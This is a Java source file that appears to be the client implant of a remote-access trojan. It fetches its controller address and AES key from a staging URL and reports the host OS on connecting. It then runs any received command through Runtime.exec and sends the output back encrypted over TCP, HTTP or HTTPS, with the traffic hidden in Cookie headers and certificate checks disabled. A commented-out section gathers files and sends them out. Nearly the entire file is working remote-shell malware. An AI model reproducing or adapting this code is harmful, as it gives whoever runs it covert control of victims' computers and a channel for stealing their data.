package com.revsni.client;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.EOFException;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.net.URL;

import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.KeyManagementException;
import java.security.KeyStore;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateException;
import java.util.Base64;
import java.util.UUID;

import javax.crypto.*;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

//import java.util.List;
//import java.util.Arrays;
//import java.util.Collection;
//import java.io.File;
//import java.io.FileInputStream;
//import com.revsni.utils.FileData;
//import com.revsni.utils.KeyboardFilesFilter;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.conn.ssl.NoopHostnameVerifier;
import org.apache.http.conn.ssl.SSLConnectionSocketFactory;
import org.apache.http.conn.ssl.TrustSelfSignedStrategy;
import org.apache.http.conn.ssl.TrustStrategy;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.ssl.SSLContexts;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.net.ssl.SSLContext;

public class Client {
    Logger logger = LogManager.getLogger(getClass());

    private UUID uniqueID;
    private Socket reqSock;
    private String[] address = new String[2];

    private DataOutputStream dataOut;
    private DataInputStream dataIn;

    private Cipher cipherEnc;
    private Cipher cipherDec;

    private CloseableHttpClient httpClient;


    private SecretKey key;
    private IvParameterSpec iv;

    private volatile boolean trigCheck = false;
    private volatile boolean connExists = false;
    private volatile boolean httpEst = false;

    KeyStore keyStore;
    SSLConnectionSocketFactory scsf;
    SSLContext sslContext = null;
    TrustStrategy acceptingTrustStrategy;

    private volatile String type;

    private volatile String keepAliveEndpoint = null;

    private final String os = System.getProperty("os.name");

    public Client(UUID uniUuid) {
        this.uniqueID = uniUuid;
        this.type = "TCP";

    }

    private boolean init() {
        logger.info("Init started!");
        if(type.equals("TCP") && os.contains("Windows")) {
            try {
                logger.error("INIT WINDOWS");

                int port = Integer.parseInt(address[1]);
                
                logger.error(address[0] + " ");
                logger.error(address[1]);

                reqSock = new Socket(address[0], port);

                dataOut = new DataOutputStream(reqSock.getOutputStream());
                dataOut.flush();
                dataIn = new DataInputStream(reqSock.getInputStream());

                sendMessage(uniqueID + ": just arrived to vacation!" + " On: " + os);
                
                connExists = true;

                return true;
            } catch(IOException | InvalidKeyException | InvalidAlgorithmParameterException | NoSuchPaddingException e) {
                logger.error("catch in init");
                e.printStackTrace();
                return false;
            }
        }
        if(type.equals("TCP")) {
            if(!connExists) {
                try {
                    logger.error("INIT");
    
                    int port = Integer.parseInt(address[1]);
                    
                    logger.error(address[0] + " ");
                    logger.error(address[1]);
    
                    reqSock = new Socket(address[0], port);
    
                    dataOut = new DataOutputStream(reqSock.getOutputStream());
                    dataOut.flush();
                    dataIn = new DataInputStream(reqSock.getInputStream());
    
                    sendMessage(uniqueID + ": just arrived to vacation!" + " On: " + os);
                    connExists = true;
    
                    return true;
                } catch(IOException | InvalidKeyException | InvalidAlgorithmParameterException | NoSuchPaddingException e) {
                    logger.error("catch in init");
                    e.printStackTrace();
                    return false;
                }
    
            } else {
                return false; 
            }
        }
        if(type.equals("HTTP")) {
            httpClient = HttpClients.createDefault();
            String uri = new String("http://" + address[0] + ":" + address[1] +"/lit");
            HttpGet httpGet = new HttpGet(uri);
            try {
                httpGet.addHeader("Cookie", Base64.getEncoder().encodeToString(cipherEnc.doFinal("est".getBytes())));
            } catch (IllegalBlockSizeException | BadPaddingException e2) {
                e2.printStackTrace();
            }
            try(CloseableHttpResponse responseInitial = httpClient.execute(httpGet)) {
                close();
                handleMessage(responseInitial.getHeaders("Cookie")[0].getValue());
                httpEst = true;
                connExists = true;
                return true;
            } catch(Exception e) {
                e.printStackTrace();
                connExists = false;
                type = "TCP";
                init();
                try {
                    sendMessage("HTTP failed, fallback to TCP");
                } catch (InvalidKeyException | InvalidAlgorithmParameterException | NoSuchPaddingException e1) {
                    e1.printStackTrace();
                }
                return false;
            }
        } 
        if(type.equals("HTTPS")) {
            logger.info("INIT HTTPS beginning");
            String keyPassphrase = "lol123";
            String uri = new String("https://" + address[0] + ":" + address[1]);

            HttpGet httpGet = new HttpGet(uri);

            KeyStore keyStore;
            SSLConnectionSocketFactory scsf;
            SSLContext sslContext = null;
            TrustStrategy acceptingTrustStrategy;

            try {
                keyStore = KeyStore.getInstance("JKS");
                keyStore.load(new FileInputStream("/home/shorida/Projekte/Revsn/revsn/src/main/java/com/revsni/server/https/certificates/keystore.jks"), keyPassphrase.toCharArray());
                //sslContext = SSLContexts.custom()
                //.loadKeyMaterial(keyStore, keyPassphrase.toCharArray())
                //.build();

                acceptingTrustStrategy = new TrustSelfSignedStrategy();
                sslContext = org.apache.http.ssl.SSLContexts.custom().loadTrustMaterial(null, acceptingTrustStrategy)
                            .build();

                httpClient = HttpClients.custom().setSSLContext(sslContext).build();  
                httpGet.addHeader("Cookie", Base64.getEncoder().encodeToString(cipherEnc.doFinal("est".getBytes())));

                scsf = new SSLConnectionSocketFactory( SSLContexts.custom().loadTrustMaterial(null, new TrustSelfSignedStrategy()).build(), NoopHostnameVerifier.INSTANCE);

                httpClient = HttpClients.custom().setSSLSocketFactory(scsf).build();
            } catch (IllegalBlockSizeException | BadPaddingException  | KeyStoreException 
                    | NoSuchAlgorithmException | CertificateException | IOException | KeyManagementException e2) {
                e2.printStackTrace();
            }
            try(CloseableHttpResponse responseInitial = httpClient.execute(httpGet)) {
                close();
                handleMessage(responseInitial.getHeaders("Cookie")[0].getValue());
                httpEst = true;
                connExists = true;
                return true;
            } catch(Exception e) {
                e.printStackTrace();
                connExists = false;
                type = "TCP";
                init();
                try {
                    sendMessage("HTTPS failed, fallback to TCP");
                    close();
                } catch (InvalidKeyException | InvalidAlgorithmParameterException | NoSuchPaddingException e1) {
                    e1.printStackTrace();
                }
                return false;
            }
        } else {
            return false;
        }
        
    }

    private void close() {
        try {
            dataIn.close();
            dataOut.close();
            reqSock.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private boolean checkTrig() throws IOException {
        //Go for webserver and extract IP, Port and Key. Then set and use the stuff
        try {
            String URL;
            if(keepAliveEndpoint == null) {
                URL = "http://127.0.0.1:8082/initial.txt";
            } else {
                URL = "http://127.0.0.1:8082/" + keepAliveEndpoint + ".txt";
            }
            URL url = new URL(URL);

            Document doc = Jsoup.parse(url, 1000 * 3);
            String text = doc.body().text();

            logger.debug(text);

            String outp[] = text.split(";");

            address[0] = outp[0];
            address[1] = outp[1];
            logger.error(address[0] + address[1]);

            byte[] decodedKey = Base64.getDecoder().decode(outp[3]);
            byte[] decodedIv = Base64.getDecoder().decode(outp[4]);

            this.type = new String(Base64.getDecoder().decode(outp[2]));

            this.key = new SecretKeySpec(decodedKey, "AES");
            this.iv = new IvParameterSpec(decodedIv);

            logger.error("CheckTrigTrue");
            trigCheck = true;
            connExists = false;
            return true;
        } catch (IOException e) {
            logger.error("catch in checktrig");
            trigCheck = false;
            return false;
        }
        
    }

    private boolean updateStuff() {
        try {
            checkTrig();
        } catch (IOException e) {
            return false;
        }
        return true;
    }

    private void sendMessage(String msg) throws InvalidKeyException, InvalidAlgorithmParameterException, NoSuchPaddingException {
        try {
            logger.error("Send message :" + msg);

            cipherEnc = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipherEnc.init(Cipher.ENCRYPT_MODE, this.key, this.iv);

            String encoded = new String(Base64.getEncoder()
                .encode(cipherEnc
                .doFinal(Base64.getEncoder()
                .encode(msg.getBytes()))));

            logger.debug(encoded);
            if(type.equals("TCP")) {
                dataOut.writeInt(encoded.getBytes().length);
                dataOut.write(encoded.getBytes());
                dataOut.flush();
            }
            if(type.equals("HTTP")) {
                httpClient = HttpClients.createDefault();
                logger.info("http://" + address[0] + ":" + address[1] +"/lit");
                HttpGet httpGet = new HttpGet("http://" + address[0] + ":" + address[1] +"/lit");
                httpGet.setHeader("Cookie", encoded);
                try {
                    httpClient.execute(httpGet);
                } catch(Exception e) {
                    e.printStackTrace();
                }
            }

            if(type.equals("HTTPS")) {
                String uri = new String("https://" + address[0] + ":" + address[1]);

                HttpGet httpGet = new HttpGet(uri);

                httpClient = HttpClients.custom().setSSLSocketFactory(scsf).build();
                try {
                    httpGet.setHeader("Cookie", encoded);
                } catch (Exception e2) {
                    e2.printStackTrace();
                }
                httpClient = HttpClients.custom().setSSLContext(sslContext).build();  
                try {
                    httpClient.execute(httpGet);
                } catch(Exception e) {
                    e.printStackTrace();
                }
            }

        } catch (IOException | NoSuchAlgorithmException | IllegalBlockSizeException | BadPaddingException e) {
            e.printStackTrace();
        }
    }

    public void handleCentral() {
        switch(type) {
            case("HTTP"): getInstr(); break;
            case("HTTPS"): logger.info("Getting Instructions for HTTPS"); getInstrHTTPS();
        }
    }

    public void handleCentral(String msg) {
        switch(type) {
            case("TCP"): handleMessage(msg);
        }
    }

    public void goForComm(String msg) {
        String answer = "";
        BufferedReader stdInput = null;
        BufferedReader stdError = null;
        try {
            Runtime rt = Runtime.getRuntime();
            Process proc = rt.exec(msg);

            stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));

            stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
            try {
                String s = null;
                while ((s = stdInput.readLine()) != null) {
                    answer += s;
                    answer += "\n";
                }
                // Read any errors from the attempted command
                while ((s = stdError.readLine()) != null) {
                    answer += s;
                    answer += "\n";
                }
                sendMessage(answer);
                stdInput.close();
                stdError.close();
            } catch (IOException | InvalidKeyException | InvalidAlgorithmParameterException | NoSuchPaddingException e) {
                logger.error("Failed to exec command: {}", msg);
            } 
        } catch(IOException e) {
            logger.error("Failed to exec command: {}", msg);
        }
    }

    public void handleMessage(String msg) {
        String answer = "";
        if(msg.length() > 1) {

            try {
                cipherDec = Cipher.getInstance("AES/CBC/PKCS5Padding");
                cipherDec.init(Cipher.DECRYPT_MODE, this.key, this.iv);
                
                String message  = new String(cipherDec.doFinal(Base64.getDecoder()
                    .decode(msg)));

                message = new String(Base64.getDecoder().decode(message));

                logger.info(message);

                if(message.equals("httpSw")) {
                    type = "HTTP";
                    updateStuff();
                    init();
                } else if (message.equals("kill")) {
                    sendMessage(uniqueID + ": said goobye, sadly.");
                    close();
                    System.exit(0);
                } else if(message.equals("httpsSw")) {
                    type = "HTTPS";
                    logger.error("Got HTTPSSW Command");
                    updateStuff();
                    logger.error("Update ran!");
                    init();
                    logger.error("Init done successfully!");
                }  
                else {

                    BufferedReader stdInput = null;
                    BufferedReader stdError = null;
                    try {
                        Runtime rt = Runtime.getRuntime();
                        Process proc = rt.exec(message);

                        stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));

                        stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
                        try {
                            String s = null;
                            while ((s = stdInput.readLine()) != null) {
                                answer += s;
                                answer += "\n";
                            }
                            // Read any errors from the attempted command
                            while ((s = stdError.readLine()) != null) {
                                answer += s;
                                answer += "\n";
                            }
                            sendMessage(answer);
                            stdInput.close();
                            stdError.close();
                
                        } catch (IOException e) {
                            sendMessage("Failed to execute: " + message);
                        } 
                    } catch (IllegalArgumentException | IOException e) {
                        if(e instanceof IllegalArgumentException) {
                            sendMessage("Do not send empty commands!");
                        } else if(e instanceof IOException) {
                            sendMessage("Failed to read BufIO");
                        }
                    }
                }
            
            } catch (InvalidKeyException | InvalidAlgorithmParameterException | NoSuchAlgorithmException | NoSuchPaddingException | IllegalBlockSizeException | BadPaddingException e) {
                logger.error("lul");
            }
        }
            
    }

    public void getInstr() {
        httpClient = HttpClients.createDefault();
        HttpGet httpGet = new HttpGet("http://" + address[0] + ":" + address[1] +"/lit");
        try {
            httpGet.addHeader("Cookie", Base64.getEncoder().encodeToString(cipherEnc.doFinal("give".getBytes())));
        } catch (IllegalBlockSizeException | BadPaddingException e1) {
            e1.printStackTrace();
        }
        try(CloseableHttpResponse responseInitial = httpClient.execute(httpGet)) {
            String instr = responseInitial.getHeaders("Cookie")[0].getValue();
            if(instr.length() > 3) {
                handleMessage(instr);
            }
        } catch(Exception e) {
            logger.info("No instructions");
        }
    }

    public void getInstrHTTPS() {
        String uri = new String("https://" + address[0] + ":" + address[1]);

        HttpGet httpGet = new HttpGet(uri);

        httpClient = HttpClients.custom().setSSLSocketFactory(scsf).build();
        try {
            httpGet.setHeader("Cookie", Base64.getEncoder().encodeToString(cipherEnc.doFinal("give".getBytes())));
        } catch (IllegalBlockSizeException | BadPaddingException e1) {
            e1.printStackTrace();
        }

        try(CloseableHttpResponse responseInitial = httpClient.execute(httpGet)) {
            logger.error("give message sent!");
            String instr = responseInitial.getHeaders("Cookie")[0].getValue();
            if(instr.length() > 3) {
                    handleMessage(instr);
            }
        } catch(Exception e) {
                logger.info("No instructions");
        }
    }
        

    //Filetransfer methodos

    /*
    private Collection<File> prepareFilesToSend() {
        String directoryPath = System.getProperty("user.dir");
        File directory = new File(directoryPath);

        File[] files = directory.listFiles(new KeyboardFilesFilter());
        List<File> filesFound = Arrays.asList(files);

        return filesFound;
    }
    
    private FileData createFileData(File file, String directory) {
        FileInputStream fileInputStream = null;
        DataInputStream dataInputStream = null;
        FileData fileData = new FileData();

        String filename = file.getName();
        fileData.setFilename(filename);
        fileData.setSourceDirectory(file.getParent());
        String destinationDirectory = uniqueID + "/" + directory + "/";
        fileData.setDestinationDirectory(destinationDirectory);

        try {
            fileInputStream = new FileInputStream(file);
            dataInputStream = new DataInputStream(fileInputStream);

            int length = (int) file.length();
            byte[] fileBytes = new byte[length];

            int totalBytesRead = 0;
            int read;

            while (totalBytesRead < length &&
                  (read = dataInputStream.read(fileBytes,totalBytesRead,length - totalBytesRead)) >= 0) {
                totalBytesRead += read;
            }

            fileData.setFileSize(length);
            fileData.setFileData(fileBytes);
            fileData.setStatus(FileData.Status.SUCCESS);
        }
        catch (IOException e) {
            e.printStackTrace();
            fileData.setStatus(FileData.Status.ERROR);
        }
        finally {
            try {
                if(fileInputStream != null)
                    fileInputStream.close();
                if (dataInputStream != null)
                    dataInputStream.close();
            }
            catch (IOException e) {
                e.printStackTrace();
            }
        }

        return fileData;
    }

    private void sendFile(File file, String directory) {
        FileData fileData = createFileData(file, directory);

        try {
            dataOut.writeObject(fileData);
            dataOut.flush();
        }
        catch (IOException e) {
            e.printStackTrace();
        }
        fileData = null;
        System.gc();
    }

    private void sendFiles(Collection<File> files, String directory) {
        System.gc();

        for (File file : files) {
            sendFile(file, directory);
        }
    }
    */

    public void run() {
        try {
            Thread.sleep(2000);
        } catch (InterruptedException e) {
        }
        try {
            while (!checkTrig() && !trigCheck) {
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        logger.error("Passed checktrig");
        if(type.equals("TCP")) {
            if (!init()) {
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                return;
            } 
        }

        if(type.equals("TCP")) {
            while (!reqSock.isClosed()) {
                try {
                    String message = receiveMessages();
                    handleCentral(message);
                    Thread.sleep(10000);
                } catch(InterruptedException e) {
                    connExists = false;
                    trigCheck = false;
                    close();
                    
                } 
            }
        }
        if(type.equals("HTTP") || type.equals("HTTPS")) {
            while(httpEst) {
                try {
                    Thread.sleep(10000);
                    handleCentral();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    private String receiveMessages(){
        try {
            int len = dataIn.readInt();
            byte[] bytes = new byte[len];
            dataIn.read(bytes, 0, len);
            String received = new String(bytes);
            if(received != null) {
                return received;
            } 
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "";
    }
}
